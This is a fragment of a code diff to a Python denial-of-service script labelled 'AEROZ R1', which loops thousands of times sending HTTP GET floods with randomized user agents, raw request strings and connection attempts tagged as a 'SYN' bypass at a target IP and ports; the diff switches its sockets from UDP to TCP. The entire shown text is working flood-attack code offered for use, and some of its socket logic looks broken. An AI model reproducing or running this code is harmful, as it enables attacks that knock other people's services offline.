@@ -3694,9 +3694,9 @@ def rand_ua():
     return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())
 ddos = 'AEROZ '
 print("AEROZ R1")
-s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setblocking(0)
-a = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 duration = 10000
 for x in range(20000):
             dport = random.randint(1, 65535) if port == 0 else port
@@ -3708,7 +3708,7 @@ for x in range(20000):
             a.send(f'GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {rand_ua()}\r\nConnection: keep-alive\r\n\r\n'.encode())
             print("HTTP SENDED")
             a.sendall(str.encode(request))
-            a.sendto(random._urandom(50411), (ip, port))
+            a.sendall(str.encode(request))
             s.connect((ip, dport)) # SYN REPORT (BYPASS)
             print("BYPASS SENDED")
             
